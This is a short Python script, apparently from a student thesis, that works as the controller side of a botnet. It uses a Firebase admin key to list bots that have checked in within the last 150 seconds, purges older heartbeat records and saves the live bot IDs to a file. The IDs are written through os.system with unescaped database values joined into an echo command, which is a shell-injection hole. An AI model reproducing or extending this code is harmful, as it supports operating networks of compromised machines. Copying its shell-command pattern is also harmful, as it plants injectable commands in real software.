import os
import firebase_admin
from firebase_admin import credentials, firestore # initialize sdk
from datetime import datetime, timedelta

cred = credentials.Certificate("tfg-nicolas-cea-firebase-adminsdk-bq588-0a7759e31d.json")
mensajeFin = "There is the list of the current Alive and Available bots:"

firebase_admin.initialize_app(cred)# initialize firestore instance

db = firestore.client() # add data

now = datetime.now()
dt_margen = (now + timedelta(seconds=-150)).strftime("%Y-%m-%d %H:%M:%S")

# Escribe una orden para la botnet
lista = []
docs = db.collection(u'ImAlive').where(u'Hora', u'>', dt_margen).stream()
cantidad = 0
for doc in docs:
    if(not(doc.get("Bot_ID") in lista)):
        lista.append(doc.get("Bot_ID"))

docs = db.collection(u'ImAlive').where(u'Hora', u'<=', dt_margen).stream()
for doc in docs:
    cantidad += 1
    if(cantidad == 1000):
        print("A large volume of data has been detected, this process could take several minutes.")
    doc.reference.delete()

print(mensajeFin)
print(lista)
str1 = ';'.join(str(e) for e in lista)
fichero = "echo "+ str1 + " > availableBots.txt"
os.system(fichero)
